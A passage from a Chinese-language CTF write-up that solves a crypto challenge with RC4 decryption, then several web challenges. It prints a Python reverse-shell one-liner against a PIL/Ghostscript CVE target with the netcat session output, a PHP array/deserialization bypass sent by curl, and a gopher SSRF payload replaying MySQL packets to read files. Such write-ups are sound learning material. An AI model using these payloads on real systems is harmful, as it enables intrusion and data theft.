</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>, <span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    key <span style=color:#ff79c6>=</span> key<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#34;_&#34;</span> <span style=color:#ff79c6>*</span> i, <span style=color:#8be9fd;font-style:italic>str</span>(i))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#8be9fd;font-style:italic>print</span>(key)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>key <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(<span style=color:#8be9fd;font-style:italic>eval</span>(key))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#8be9fd;font-style:italic>print</span>(key)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>key <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>hex</span>(key)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#8be9fd;font-style:italic>print</span>(base64<span style=color:#ff79c6>.</span>b16decode(key[<span style=color:#bd93f9>2</span>:]<span style=color:#ff79c6>.</span>upper()))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>$ python2 crypto1<span style=color:#ff79c6>/</span>rep<span style=color:#ff79c6>.</span>py <span style=color:#6272a4># 注意这里得用 python2, 3的话会自动转浮点, 精度会丢失</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#bd93f9>5</span>((<span style=color:#bd93f9>2</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>6</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>4</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>4</span>)((<span style=color:#bd93f9>3</span><span style=color:#ff79c6>%</span>(<span style=color:#bd93f9>3</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span><span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>3</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>6</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>6</span><span style=color:#ff79c6>//</span>(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span>)))))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>2</span>(((<span style=color:#bd93f9>8</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>2</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>8</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>4</span>))(<span style=color:#bd93f9>1</span>(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span>))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span>(((<span style=color:#bd93f9>9</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>7</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>))((<span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>6</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>2</span>)))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>((<span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>6</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>1</span>))(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span>))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>2</span>(<span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>3</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span>))(<span style=color:#bd93f9>9</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>4</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>)(<span style=color:#bd93f9>8</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>6</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span>)((<span style=color:#bd93f9>4</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>4</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>4</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>1</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span>)(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>7</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>6</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>7</span>)<span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span>)<span style=color:#bd93f9>9</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>(((<span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>7</span>)<span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>-</span>(<span style=color:#bd93f9>8</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>8</span>))<span style=color:#bd93f9>7</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>8</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>2</span>)(((<span style=color:#bd93f9>4</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>)(<span style=color:#bd93f9>6</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>4</span>))<span style=color:#bd93f9>3</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>3</span>((<span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>)<span style=color:#bd93f9>5</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>3</span>(((<span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>6</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span>)(<span style=color:#bd93f9>3</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>5</span>))<span style=color:#bd93f9>2</span>)<span style=color:#ff79c6>+</span>(<span style=color:#bd93f9>1</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>1</span>)(((<span style=color:#bd93f9>8</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span>)<span style=color:#ff79c6>%</span><span style=color:#bd93f9>6</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>)<span style=color:#ff79c6>*</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span>((<span style=color:#bd93f9>6</span><span style=color:#ff79c6>/</span>(<span style=color:#bd93f9>5</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>3</span>))<span style=color:#ff79c6>+</span><span style=color:#bd93f9>7</span>)((<span style=color:#bd93f9>9</span><span style=color:#ff79c6>%</span><span style=color:#bd93f9>7</span>)<span style=color:#bd93f9>2</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>5</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>//</span><span style=color:#bd93f9>3</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>9</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>3</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#bd93f9>5287002131074331513</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>I_4m<span style=color:#ff79c6>-</span>k3y
</span></span></code></pre></div><p>I_4m-k3y 就是 key 了, 然后又找到一个现成的脚本, 解密一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>crypt</span>(data, key):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;RC4 algorithm&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    x <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    box <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>256</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>256</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        x <span style=color:#ff79c6>=</span> (x <span style=color:#ff79c6>+</span> box[i] <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>ord</span>(key[i <span style=color:#ff79c6>%</span> <span style=color:#8be9fd;font-style:italic>len</span>(key)])) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        box[i], box[x] <span style=color:#ff79c6>=</span> box[x], box[i]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    x <span style=color:#ff79c6>=</span> y <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    out <span style=color:#ff79c6>=</span> []
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff79c6>for</span> char <span style=color:#ff79c6>in</span> data:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        x <span style=color:#ff79c6>=</span> (x <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        y <span style=color:#ff79c6>=</span> (y <span style=color:#ff79c6>+</span> box[x]) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        box[x], box[y] <span style=color:#ff79c6>=</span> box[y], box[x]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        out<span style=color:#ff79c6>.</span>append(<span style=color:#8be9fd;font-style:italic>chr</span>(<span style=color:#8be9fd;font-style:italic>ord</span>(char) <span style=color:#ff79c6>^</span> box[(box[x] <span style=color:#ff79c6>+</span> box[y]) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>]))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;&#39;</span><span style=color:#ff79c6>.</span>join(out)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>tencode</span>(data, key, encode<span style=color:#ff79c6>=</span>base64<span style=color:#ff79c6>.</span>b64encode, salt_length<span style=color:#ff79c6>=</span><span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;RC4 encryption with random salt and final encoding&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    salt <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>for</span> n <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(salt_length):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        salt <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(random<span style=color:#ff79c6>.</span>randrange(<span style=color:#bd93f9>256</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    data <span style=color:#ff79c6>=</span> salt <span style=color:#ff79c6>+</span> crypt(data, sha1(key <span style=color:#ff79c6>+</span> salt)<span style=color:#ff79c6>.</span>digest())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#ff79c6>if</span> encode:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        data <span style=color:#ff79c6>=</span> encode(data)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    <span style=color:#ff79c6>return</span> data
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>tdecode</span>(data, key, decode<span style=color:#ff79c6>=</span>base64<span style=color:#ff79c6>.</span>b64decode, salt_length<span style=color:#ff79c6>=</span><span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;RC4 decryption of encoded data&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#ff79c6>if</span> decode:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        data <span style=color:#ff79c6>=</span> decode(data)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    salt <span style=color:#ff79c6>=</span> data[:salt_length]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>    <span style=color:#ff79c6>return</span> crypt(data[salt_length:], sha1(key <span style=color:#ff79c6>+</span> salt)<span style=color:#ff79c6>.</span>digest())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#8be9fd;font-style:italic>print</span> tdecode(strCipher, key)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#6272a4># C1ctf{5f601e8cc1bde1f1a54e336158ba766d}</span>
</span></span></code></pre></div><h2 id=web>Web</h2><h3 id=0x01-resize-your-image>0x01 resize your image</h3><p>vulhub <a href=https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2018-16509 title rel="noopener nofollow noreferrer" target=_blank>原题</a>, payload 改一下</p><p><code>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your IP',Your Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ nc <span style=color:#ff79c6>-</span>lvvp <span style=color:#bd93f9>19132</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Listening on [<span style=color:#bd93f9>0.0.0.0</span>] (family <span style=color:#bd93f9>0</span>, port <span style=color:#bd93f9>19132</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>Connection <span style=color:#ff79c6>from</span> <span style=color:#bd93f9>212.64.85.131</span> <span style=color:#bd93f9>40172</span> received!
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#ff79c6>/</span><span style=color:#8be9fd;font-style:italic>bin</span><span style=color:#ff79c6>/</span>sh: <span style=color:#bd93f9>0</span>: can<span style=color:#f1fa8c>&#39;t access tty; job control turned off</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#6272a4># ls</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>app<span style=color:#ff79c6>.</span>py
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>flag
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span><span style=color:#6272a4># cat flag</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span><span>C1CTF{hello_world}
</span></span></code></pre></div><h3 id=0x02web签到>0x02 web签到</h3><p>改一下 cookie 就行, 我用的是 <a href=https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg title rel="noopener nofollow noreferrer" target=_blank>EditThisCookie</a></p><p><img src=https://i.loli.net/2019/03/08/5c826dfb50be6.png#center alt referrerpolicy=no-referrer></p><p><img src=https://i.loli.net/2019/03/08/5c826e11a3277.png#center alt referrerpolicy=no-referrer></p><h3 id=0x03php是世界上最好的语言>0x03 php是世界上最好的语言</h3><p>在 http://212.64.85.131/robots.txt 可以找到提示, <code>Disallow: /flag.zip</code>, 下下来就可以得到源码, 接下来就是源码审计</p><ol><li><code>($a == $b) + (md5($a) != sha1($b))</code> 这个很好绕, 传两个值不一样的数组就可以绕过, 比如 <code>a[1]=1&b[1]=2</code>. 原理是 md5 和 sha1 对 数组会返回 NULL</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>php <span style=color:#ff79c6>&gt;</span> var_dump(md5(<span style=color:#ff79c6>array</span>()));
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>PHP Warning<span style=color:#ff79c6>:</span>  md5() expects parameter <span style=color:#bd93f9>1</span> to be string, <span style=color:#ff79c6>array</span> given in php shell code on line <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Warning<span style=color:#ff79c6>:</span> md5() expects parameter <span style=color:#bd93f9>1</span> to be string, <span style=color:#ff79c6>array</span> given in php shell code on line <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#ff79c6>NULL</span>
</span></span></code></pre></div><p>2.<code>$token['user'] == "????????" && $token['pass'] == "????????"</code> 我竟然以为真的要想办法绕过&mldr; 后来试了下居然真的只要让 <code>user=????????</code> 就行了233</p><p>3.<code>$flag->middle === $flag->left && $flag->middle === $flag->right</code> 这个绕过第一感觉是不可能, 除非能有像 C++ 那样的引用, 然后百度了一下&mldr; 居然真的有这种骚东西 还真的可以序列化 233</p><p>如果反序列化这方面有问题的话可以百度一下对应的教程</p><p>整合一下得到 payload <code>curl "http://212.64.85.131/?mode=begin&a[1]=1&b[1]=2" -d 'token=a:2:{s:4:"user";s:8:"????????";s:4:"pass";s:8:"????????";}&flag=O:9:"last_task":3:{s:4:"left";N;s:6:"middle";R:2;s:5:"right";R:2;}'</code></p><p>得到 this is your flag C1ctf{Php_1s_best_language_in_the_world}</p><h3 id=0x04今年还有小姐姐>0x04 今年还有小姐姐</h3><p>fuzz 一下 file:// 被过滤了, 然后看了下 HINT. 发现在 info.php 左下角非常猥琐的藏着 sql 语句&mldr;</p><p><img src=https://i.loli.net/2019/03/08/5c826e702af72.png#center alt referrerpolicy=no-referrer></p><p>基本上可以确定是 gopher + ssrf 了</p><p>让他访问 http://127.0.0.1:3306 也确实可以得到 mysql 的 banner</p><p><img src=https://i.loli.net/2019/03/08/5c826e89d5c9b.png#center alt referrerpolicy=no-referrer></p><p>具体原理可以看<a href=https://www.freebuf.com/articles/web/159342.html title rel="noopener nofollow noreferrer" target=_blank>这里</a>, 简单来说 gopher 协议可以将任意内容通过 tcp 发送, 而 mysql 在空密码时握手包的内容是固定的, 我们就可以通过 gopher 来读取数据库中的内容</p><p>这里可以通过在本地搭一个空密码的 root 账号的 mysql 加上 wireshark 来重放一遍客户端发送的数据, 得到服务器上数据库的应答</p><p>这里可以用 -e 选项来直接执行命令. 通过提示里的表结构可以构造如下语句</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>mysql -u root -e <span style=color:#f1fa8c>&#34;SELECT path FROM ctf.flag&#34;</span> -h127.0.0.1
</span></span></code></pre></div><p>然后在 wireshark 里面导出以后用 urlencode 一下加在 gopher://127.0.0.1:3306/A 后面(注意A留着, 不能删), 这里我的 payload 是 </p><p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520083%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql%1A%00%00%00%03SELECT%20path%20FROM%20ctf.flag%01%00%00%00%01</code></p><p><img src=https://i.loli.net/2019/03/08/5c826ec9b4061.png#center alt referrerpolicy=no-referrer></p><p><code>/var/lib/mysql-files/flag.txt</code> 即是路径, 再通过 load_file 来读取它</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>mysql -u root -e <span style=color:#f1fa8c>&#34;SELECT load_file(&#39;/var/lib/mysql-files/flag.txt&#39;)&#34;</span> -h127.0.0.1
